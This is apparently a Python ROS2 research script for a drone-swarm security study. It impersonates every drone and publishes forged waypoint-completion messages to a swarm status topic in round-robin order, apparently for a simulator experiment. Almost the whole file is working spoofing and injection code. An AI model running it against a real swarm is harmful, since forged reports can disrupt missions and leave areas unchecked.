#!/usr/bin/env python3
"""
interleaved_attacker.py
=======================
New Layer 1 attack variant for the T-ITS extension. Spoofs all-drone
identities at scale, but distributes the false reports across the
waypoint grid in an interleaved order rather than sequentially.

For N drones with K waypoints each (total = N*K), the sequential
strategy reports waypoints in zone order:
    drone1 wp 0, 1, 2, ..., K-1, drone2 wp K, K+1, ...

The interleaved strategy round-robins across drones at each step:
    drone1 wp 0, drone2 wp 1, drone3 wp 2, ..., drone1 wp 1, drone2 wp 2, ...

This produces gaps that are spatially distributed rather than
contiguous, which the T-ITS extension uses to compute a Shannon-entropy
metric over the gap distribution.

Usage
-----
python3 interleaved_attacker.py \
        --num-drones 10 --waypoints-per-drone 9 \
        --discovery-time 3.0 --spoof-delay 0.5
"""

import argparse
import json
import time

import rclpy
from rclpy.node import Node
from std_msgs.msg import String


class InterleavedAttacker(Node):
    def __init__(self, num_drones, waypoints_per_drone,
                 discovery_time, spoof_delay):
        super().__init__('interleaved_attacker')
        self.num_drones = num_drones
        self.waypoints_per_drone = waypoints_per_drone
        self.total_wp = num_drones * waypoints_per_drone
        self.discovery_time = discovery_time
        self.spoof_delay = spoof_delay

        self.pub = self.create_publisher(
            String, '/swarm/waypoint_status', 10)

        self.get_logger().info(
            f'Interleaved attacker armed: N={num_drones}, '
            f'WP={self.total_wp}, discovery={discovery_time}s, '
            f'delay={spoof_delay}s')

    def build_injection_plan(self):
        """Round-robin across drones, taking the next waypoint from
        each drone's zone in turn until all are covered.

        Assumes the simulator runs with --zone-mode contiguous (the
        default), where drone i owns waypoints [(i-1)*K, i*K).
        """
        K = self.waypoints_per_drone
        zones = {
            i + 1: list(range(i * K, (i + 1) * K))
            for i in range(self.num_drones)
        }
        plan = []
        for k in range(self.waypoints_per_drone):
            for drone_idx in range(1, self.num_drones + 1):
                plan.append((f'drone{drone_idx}', zones[drone_idx][k]))
        return plan

    def run(self):
        self.get_logger().info(f'Discovering for {self.discovery_time}s...')
        time.sleep(self.discovery_time)

        plan = self.build_injection_plan()
        self.get_logger().info(
            f'Injection plan size: {len(plan)} reports across '
            f'{self.num_drones} identities')

        for drone_id, wp in plan:
            payload = json.dumps({'drone_id': drone_id,
                                  'waypoint_id': wp})
            msg = String()
            msg.data = payload
            self.pub.publish(msg)
            time.sleep(self.spoof_delay)

        self.get_logger().info('Injection complete.')


def main():
    p = argparse.ArgumentParser()
    p.add_argument('--num-drones', type=int, default=10)
    p.add_argument('--waypoints-per-drone', type=int, default=9)
    p.add_argument('--discovery-time', type=float, default=3.0)
    p.add_argument('--spoof-delay', type=float, default=0.5)
    args = p.parse_args()

    rclpy.init()
    a = InterleavedAttacker(args.num_drones, args.waypoints_per_drone,
                            args.discovery_time, args.spoof_delay)
    try:
        a.run()
    except KeyboardInterrupt:
        pass
    finally:
        a.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
